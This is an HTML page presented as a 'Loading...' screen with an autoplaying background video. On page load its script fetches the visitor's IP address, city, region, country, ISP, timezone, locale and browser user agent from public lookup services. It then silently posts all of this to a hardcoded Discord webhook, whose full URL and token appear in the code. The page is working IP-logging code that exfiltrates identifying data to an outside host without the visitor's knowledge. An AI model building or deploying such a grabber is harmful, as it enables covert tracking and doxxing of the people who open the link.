<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Loading...</title>
<style>
  html, body { margin:0; height:100%; background:#000; overflow:hidden; font-family: Arial, sans-serif; color:#fff; }
  #bg { position:fixed; inset:0; width:100vw; height:100vh; object-fit:cover; z-index:0; background:#000; }
  .overlay { position:fixed; inset:0; display:grid; place-items:center; z-index:2; }
  .panel { background:rgba(0,0,0,0.6); padding:20px 25px; border-radius:12px; backdrop-filter:blur(6px); max-width:750px; width:90%; }
  h1 { margin:0 0 10px 0; text-align:center; }
  pre { margin:0; font-size:14px; white-space:pre-wrap; word-break:break-word; }
  #soundBtn {
    margin-top:15px; width:100%; padding:10px; border-radius:8px; border:none;
    background:rgba(255,255,255,0.15); color:#fff; cursor:pointer; font-size:14px; display:none;
  }
  #soundBtn:hover { background:rgba(255,255,255,0.25); }
  #hint { margin-top:10px; font-size:12px; opacity:0.75; text-align:center; }
</style>
</head>
<body>

<video id="bg" autoplay loop playsinline preload="auto">
  <source src="./Vibe.mp4" type="video/mp4">
</video>

<div class="overlay">
  <div class="panel">
    <h1>Loading IP Info...</h1>
    <pre id="info">Please wait...</pre>
    <button id="soundBtn">Click to enable sound</button>
    <div id="hint">If sound doesnâ€™t start automatically, click the button once.</div>
  </div>
</div>

<script>
  const video = document.getElementById("bg");
  const soundBtn = document.getElementById("soundBtn");
  const infoBox = document.getElementById("info");

  // Your Discord webhook URL
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1474753431695659191/mzHMpinVBQC4pbmjH4iX8aMUSvsD5AVutTJW3MM92VZVaSG_YFE0nKtpRK18gDsNANP_";

  function forceAudioOn() {
    video.muted = false;
    video.volume = 1.0;
  }

  async function tryAutoplayWithSound() {
    forceAudioOn();
    try {
      await video.play();
      if (video.muted || video.volume === 0) soundBtn.style.display = "block";
      else soundBtn.style.display = "none";
    } catch (e) {
      video.muted = true;
      video.volume = 1.0;
      try { await video.play(); } catch {}
      soundBtn.style.display = "block";
    }
  }

  soundBtn.addEventListener("click", async () => {
    forceAudioOn();
    try {
      await video.play();
      soundBtn.style.display = "none";
    } catch (e) {
      soundBtn.textContent = "Browser still blocked sound";
    }
  });

  window.addEventListener("click", async () => {
    if (soundBtn.style.display !== "none") {
      forceAudioOn();
      try { await video.play(); soundBtn.style.display = "none"; } catch {}
    }
  });

  tryAutoplayWithSound();

  async function sendToDiscord(content) {
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: "```" + content + "```"
        })
      });
    } catch (e) {
      console.error("Failed to send to Discord", e);
    }
  }

  async function loadIPInfo() {
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const { ip } = await ipRes.json();
      const detailRes = await fetch("https://ipapi.co/json/");
      const d = await detailRes.json();

      const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const browserLocale = navigator.language;
      const ua = navigator.userAgent;

      const text =
        `IP Address: ${ip}\n\n` +
        `City: ${d.city}\n` +
        `Region: ${d.region}\n` +
        `Country: ${d.country_name}\n` +
        `ISP: ${d.org}\n\n` +
        `Timezone (IP): ${d.timezone}\n` +
        `Timezone (Browser): ${browserTz}\n` +
        `Locale: ${browserLocale}\n\n` +
        `User Agent:\n${ua}`;

      infoBox.textContent = text;

      // send the same text to Discord
      sendToDiscord(text);
    } catch (e) {
      infoBox.textContent = "Failed to load IP info.";
    }
  }

  loadIPInfo();
</script>

</body>
</html>
